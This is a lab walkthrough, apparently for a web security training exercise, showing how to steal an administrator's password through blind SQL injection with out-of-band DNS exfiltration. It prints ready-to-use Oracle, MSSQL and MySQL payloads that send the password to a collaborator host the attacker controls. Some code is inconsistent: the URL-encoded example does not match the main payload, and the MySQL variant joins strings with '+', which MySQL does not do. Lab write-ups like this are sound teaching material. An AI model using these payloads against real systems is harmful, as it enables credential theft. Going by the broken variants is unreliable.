# 🎯 **Blind SQL Injection with Out-of-Band Data Exfiltration – Lab Walkthrough** 🎯

🎥 **Hi everyone!**  
Today, we're tackling **Lab #16: Blind SQL Injection with Out-of-Band Data Exfiltration**. We'll exploit a blind SQL injection vulnerability to **steal the administrator’s password**, then log in using it.

Let’s dive into how you can exfiltrate sensitive data from a database using **out-of-band (OOB) DNS interactions via Burp Collaborator**. 🔍🕵️‍♂️

## 🧪 Lab Overview

- **Vulnerable Parameter**: `TrackingId` cookie used for analytics
- **SQL Query**: Executed asynchronously and has **no effect on response**
- **Goal**:
  1. **Extract** the password of the `administrator` user from the `users` table
  2. **Log in** as the administrator using that password
- **Attack Vector**: Blind SQL injection + OOB DNS lookup via **Burp Collaborator**

> 💡 This builds upon the previous lab where we triggered a DNS lookup. Now we’ll leak actual **sensitive data** through that same channel!

## 🚀 Step-by-Step Guide with Emoji Magic 🌟

### 1️⃣ **Open Burp Collaborator Client**

🟢 Go to **Burp > Collaborator > Copy to clipboard**  
📌 Paste your unique collaborator domain (e.g., `abcxyz.oastify.net`) somewhere safe  
🧠 This is how we’ll receive the stolen data — if the server sends a DNS request here, we know our attack worked!

### 2️⃣ **Capture the Request with Burp Proxy**

🌐 Visit the lab homepage  
🔌 Ensure **FoxyProxy/Burp Proxy is active**  
🔁 Intercept the request in **Proxy > HTTP History**  
📤 Right-click → **Send to Repeater**

### 3️⃣ **Identify the Vulnerable Parameter**

🍪 Look at the `TrackingId` cookie value  
It likely looks like:
```
TrackingId=abc123;
```

This cookie is being used in a backend SQL query — and it's **not sanitized properly**, making it vulnerable to SQL injection. 🚨

### 4️⃣ **Craft Your OOB SQL Injection Payload (Oracle)**

Since we already determined this is an **Oracle database** (from the previous lab), we’ll use an XXE-based payload to trigger a DNS lookup that includes the administrator’s password.

#### 📦 Oracle XXE-based OOB Payload with Data Exfiltration:
```sql
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
```

🧩 Replace `BURP-COLLABORATOR-SUBDOMAIN` with your actual subdomain from step 1.

### 5️⃣ **URL Encode the Payload**

✅ In Burp Repeater, select the payload → **Ctrl + U** to URL encode it  
📘 Ensures special characters are handled correctly by the server.

Example:
```
TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE+root+%5B+...
```

### 6️⃣ **Send the Modified Request**

🔄 Hit **Send** in Repeater  
🕒 Wait a few seconds  
🔁 Click **Poll Now** in the Collaborator tab

👀 You should see a new interaction from the application's IP address — and in the **subdomain**, you’ll see the **administrator’s password** embedded in the DNS lookup!

### 7️⃣ **Use the Password to Log In**

🔐 Go to **My Account** page  
📧 Enter username: `administrator`  
🗝️ Paste the password retrieved from Collaborator  
🔓 Click **Login**

🎉 **Congratulations! You’ve successfully solved the lab!**

## 🛡️ Real-World Tip:

In real-world scenarios, attackers use similar techniques to:
- Steal credentials 📤
- Extract API keys or tokens 🔐
- Enumerate internal systems 🌐

Always sanitize input and avoid leaking any internal behavior or data via error messages or external interactions.

## 📝 Summary Checklist ✅

| Step | Action |
|------|--------|
| 🔹 | Open Burp Collaborator & copy your subdomain |
| 🔹 | Send home page request to Repeater |
| 🔹 | Inject OOB payload into TrackingId cookie |
| 🔹 | URL encode the payload |
| 🔹 | Send the modified request |
| 🔹 | Check Collaborator for DNS interaction with leaked password |
| 🔹 | Use password to log in as administrator |
| 🔹 | Celebrate success 🎊 |

## 📚 Bonus: Other DB Payloads (For Future Reference)

If Oracle doesn’t work, try other DB-specific payloads:

### Microsoft SQL Server 🖥️
```sql
'; exec master..xp_dirtree '\\BURP-COLLABORATOR-SUBDOMAIN\'+(SELECT password FROM users WHERE username='administrator')+'\\test'--
```

### MySQL 🗄️
```sql
AND LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\'+(SELECT password FROM users WHERE username='administrator')+'.txt')
```

Remember to adjust syntax and encoding accordingly!

## 🎬 Final Words

This lab showed us how **blind SQL injection** can be weaponized to **exfiltrate sensitive data** even when there's no visible output. Using **Burp Collaborator**, we turned a silent vulnerability into a powerful data-leak vector.

💬 Drop questions or thoughts in the comments — happy hacking! 🛠️👾

🔐 Until next time, stay secure and keep learning!  
